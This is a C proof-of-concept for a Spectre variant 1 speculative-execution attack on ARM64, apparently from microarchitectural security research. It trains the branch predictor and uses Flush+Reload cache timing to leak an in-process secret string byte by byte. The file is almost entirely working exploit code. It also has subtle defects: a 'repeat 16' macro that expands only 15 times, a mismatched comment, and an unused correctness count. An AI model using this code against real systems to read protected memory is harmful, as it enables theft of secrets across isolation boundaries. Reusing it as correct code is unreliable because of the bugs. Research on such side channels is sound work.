#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h> 
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <malloc.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include "utils.h"

#define STRIDE 4096
#define RELOAD_BUF_SIZE STRIDE * 256
#define ITER 200

#define MOV(n)	\
	asm volatile(	\
		".rept %0\n" \
		"mov x10, x10\n" \
		".endr\n"	\
		::"i" (n): "x10" \
	)

#define NOPS(n) \
    asm volatile( \
        ".rept %0\n" \
        "nop\n" \
        ".endr\n" \
        :: "i" (n) \
    )

#define EORS(n) \
    asm volatile( \
        ".rept %0\n" \
        "eor x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define ADDS(n) \
    asm volatile( \
        ".rept %0\n" \
        "adds x10, x10, #1\n" \
        ".endr\n" \
        :: "i" (n) \
		:"x10" \
    )

#define REPEAT_16(x)  x x x x x x x x x x x x x x x
#define REPEAT_8(x)  x x x x x x x x
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS _IOR(WOM_MAGIC_NUM, 0, unsigned long)


static unsigned int size __attribute__((aligned(4096))) = 16;
static unsigned int *size_ptr1 = &size;
static unsigned int **size_ptr2 = &size_ptr1;
static unsigned int ***size_ptr3 = &size_ptr2;
static unsigned int ****size_ptr4 = &size_ptr3;
uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t *reloadbuffer;
unsigned char* memory_read_write;
unsigned char* memory_none;
char *secret = "SPECTRE_EXECUTE!";
static unsigned char data __attribute__((aligned(4096))) = 32;
static volatile uint8_t pick = 0; 

/*
 * Measure the latency: check whether dco kicks in
 */
void *wom_get_address(int fd) {
    void *addr = NULL;

    if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
        return NULL;

    return addr;
}

static inline  __attribute__((always_inline)) void spectre_v1( size_t index, int fd, int index2) {
	mprotect(memory_none, 4096, PROT_READ);
	cacheflush(&size);
#ifdef N
	MOV(N);
#endif
	isb();

	if(index < size)
	{	
		if(fake_buffer[index] > 16){
			memory_none[0] = 0x65;
			pick = reloadbuffer[memory_none[0] << 12];
		}
	}
	for(volatile int z = 0; z < 100; z++);
}

static inline __attribute__((always_inline)) void leak(size_t target, uint8_t *byte, int fd, int index2) {
	int index, max = 0;
	size_t train_index, probe_addr;
	int results[256];
	int hit = 0;


	int random_int;
	uint64_t init, end;

	memset(results, 0 , sizeof(int) * 256);
	for (int tries = ITER; tries > 0; tries--) {

		/*
		 * flush reload buffer
		 */
		for (int i = 0; i < 256; i++)
			cacheflush(&reloadbuffer[i * STRIDE]); 

		train_index = tries % size;
		for (int j = 0; j <= 10; j++) {

//			memset(memory_read_write, 0, 100);
			/*
			 *poison branch predictor
			 */
			random_int = random(5, 7);
			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
			probe_addr = (probe_addr | (probe_addr >> 8)); 
			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
			for(volatile int z = 0; z < 100; z++){}
			isb();
			EORS(300);
			spectre_v1(probe_addr, 0, index2);
		}

		/*
		 * reload reload buffer 
		 */
		for (int i = 0; i < 256; i++)
		{
			index = ((i * 167) + 13) & 255;  // mixed access order

			isb();
			init = get_cycles();
			pick = reloadbuffer[index * STRIDE];
			end = get_cycles();
			isb();
			if (end - init <= 190 && index != fake_buffer[tries % size])
				results[index]++; 
		}

	}

	max = results[0];
	for(int m = 0; m < 256; m++){
		if(results[m] > max){
			max = results[m];
			hit = m;
		}
	}
	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
	*byte = (uint8_t)hit;
}

int main(int argc, const char * * argv) {
	reloadbuffer = (unsigned char *)mmap(0, RELOAD_BUF_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	memory_read_write = (unsigned char *)mmap(0, 4096, PROT_READ, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
	memory_none = memalign(4096, 4096);
	memset(memory_none, 0x64, 4096);

	size_t offset = (size_t)(secret - (char *)fake_buffer);
	int secret_len = strlen(secret);
	uint8_t byte;
	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
	memset(reloadbuffer, 1, sizeof(uint8_t) * RELOAD_BUF_SIZE);
	if (mprotect(memory_none, 4096, PROT_READ) == -1){
		printf("mprotect error\n");
	}
	uint8_t *leaked = (uint8_t *)malloc(sizeof(uint8_t) * secret_len);




	int i =  0;
	int index2 = 0;
	REPEAT_16(
		leak(offset + i, &byte, 0, index2);
		leaked[i] = byte;
		i = i + 1;		
		index2 = index2 + 1;
	);

	for(int i = 0; i < secret_len; i++){
		printf("%c", leaked[i]);
	}
	printf("\n");
	
	int correct = 0;
	for(int i = 0; i < 16; i++){
		if(leaked[i] == secret[i]){
			correct ++;
		}
	}

	free(leaked);
	leaked = NULL;
	return 0;
}
